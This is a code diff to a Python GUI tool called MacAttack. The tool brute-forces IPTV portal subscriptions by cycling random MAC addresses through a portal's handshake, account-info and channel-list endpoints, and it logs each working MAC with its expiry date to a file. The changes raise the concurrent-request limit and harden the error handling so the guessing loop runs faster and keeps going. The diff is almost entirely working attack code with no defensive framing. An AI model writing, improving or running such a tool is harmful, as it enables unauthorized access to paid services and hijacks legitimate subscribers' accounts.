@@ -421,7 +421,7 @@ class MacAttack(QMainWindow):
         # Speed input (SpinBox)
         self.speed_label = QLabel("Speed:")
         self.concurrent_tests = QSpinBox()
-        self.concurrent_tests.setRange(1, 10)
+        self.concurrent_tests.setRange(1, 15)
         self.concurrent_tests.setValue(10)
         combined_layout.addWidget(self.speed_label)
         combined_layout.addWidget(self.concurrent_tests)
@@ -469,7 +469,7 @@ class MacAttack(QMainWindow):
             border-right: 12px solid #2E2E2E;
             border-bottom: 0px;
         """)
-        self.error_text.setPlainText("Error LOG:\nIt's normal for a few errors to appear down here.")
+        self.error_text.setPlainText("Error LOG:\nIt's normal for a few errors to appear down here.\nwhen speed is set high\nIf errors are getting spammed, lower the speed.")
         self.error_text.setReadOnly(True)
         layout.addWidget(self.error_text)
         layout.addSpacing(15)  # Adds space
@@ -694,8 +694,8 @@ class MacAttack(QMainWindow):
 
         num_tests = self.concurrent_tests.value()
         # Limit to a maximum of 10 concurrent tests, 'cause we’re not running a circus here.
-        if num_tests > 10:
-            num_tests = 10
+        if num_tests > 15:
+            num_tests = 15
 
         # Save current settings to a file so they don’t get lost forever
         self.SaveTheDay()
@@ -714,19 +714,19 @@ class MacAttack(QMainWindow):
             
     def BigMacAttack(self):
         # BigMacAttack: Two all-beef patties, special sauce, lettuce, cheese, pickles, onions, on a sesame seed bun.
-        while self.running:
-            mac = self.RandomMacGenerator()
+        while self.running:  # Loop will continue as long as self.running is True
+            mac = self.RandomMacGenerator()  # Generate a random MAC
             self.update_mac_label_signal.emit(f"Testing MAC: {mac}")
 
             try:
-                s = requests.Session()
+                s = requests.Session()  # Create a session
                 s.cookies.update({'mac': mac})
                 url = f"{self.base_url}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
 
                 res = s.get(url, timeout=10, allow_redirects=False)
                 if res.text:
                     data = json.loads(res.text)
-                    tok = data['js']['token']
+                    tok = data.get('js', {}).get('token')  # Safely access token to prevent KeyError
 
                     url2 = f"{self.base_url}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
                     headers = {"Authorization": f"Bearer {tok}"}
@@ -734,17 +734,28 @@ class MacAttack(QMainWindow):
 
                     if res2.text:
                         data = json.loads(res2.text)
-                        if 'js' in data and 'mac' in data['js'] and 'phone' in data['js']:
+                        # Ensure required keys exist before accessing
+                        if 'js' in data and 'mac' in data['js'] and 'phone' in data['js']:  
                             mac = data['js']['mac']
                             expiry = data['js']['phone']
 
                             url3 = f"{self.base_url}/portal.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
                             res3 = s.get(url3, headers=headers, timeout=10, allow_redirects=False)
-                            count = 0
 
+                            count = 0
                             if res3.status_code == 200:
-                                channels_data = json.loads(res3.text)["js"]["data"]
-                                count = len(channels_data)
+                                # Updated handling with type checks to avoid unexpected TypeErrors
+                                try:
+                                    response_data = json.loads(res3.text)
+                                    if isinstance(response_data, dict) and "js" in response_data and "data" in response_data["js"]:
+                                        channels_data = response_data["js"]["data"]
+                                        count = len(channels_data)  # Count channels if data is valid
+                                    else:
+                                        self.update_error_text_signal.emit("Unexpected data structure for channels.")
+                                        count = 0
+                                except (TypeError, json.decoder.JSONDecodeError) as e:
+                                    self.update_error_text_signal.emit(f"Data parsing error for channels data: {str(e)}")
+                                    count = 0
 
                             if count > 0:
                                 print("Mac found")
@@ -753,23 +764,25 @@ class MacAttack(QMainWindow):
                                     self.output_file = open(output_filename, "a")
 
                                 result_message = f"{self.iptv_link}\nMAC = {mac}\nExpiry = {expiry}\nChannels = {count}\n\n"
-                                self.update_output_text_signal.emit(result_message)  # Emit the signal to update QTextEdit
+                                self.update_output_text_signal.emit(result_message)  # Emit signal to update QTextEdit
 
-                                # Writing result_message to the file
+                                # Write result_message to the output file
                                 self.output_file.write(result_message)
-                                self.output_file.flush()  # Optional: Ensures data is written to the file immediately,
-                            
-                            
-                            
-                            
+                                self.output_file.flush()  # Optional: Ensures data is written immediately
                             else:
-                                result_message = f"There are no channels for MAC: {mac}. Bummer."
+                                result_message = f"MAC: {mac} connects, but has 0 channels. Bummer."
                                 self.update_error_text_signal.emit(result_message)
-
                     else:
                         self.update_error_text_signal.emit(f"No JSON response for MAC {mac}")
-            except (json.decoder.JSONDecodeError, requests.exceptions.RequestException) as e:
-                self.update_error_text_signal.emit(f"Error for MAC {mac}: {str(e)}")
+
+            # Catch all relevant exceptions and ensure the loop continues
+            except (json.decoder.JSONDecodeError, requests.exceptions.RequestException, TypeError) as e:
+                if "Expecting value: line 1 column 1 (char 0)" in str(e):
+                    self.update_error_text_signal.emit(
+                        f"Error for MAC: {mac} : {str(e).replace('Expecting value: line 1 column 1 (char 0)', 'Empty response')}"
+                    )
+                else:
+                    self.update_error_text_signal.emit(f"Error for MAC {mac}: {str(e)}")
                      
     def SaveTheDay(self):
         # Saving the day by storing our preferences so we can be lazy
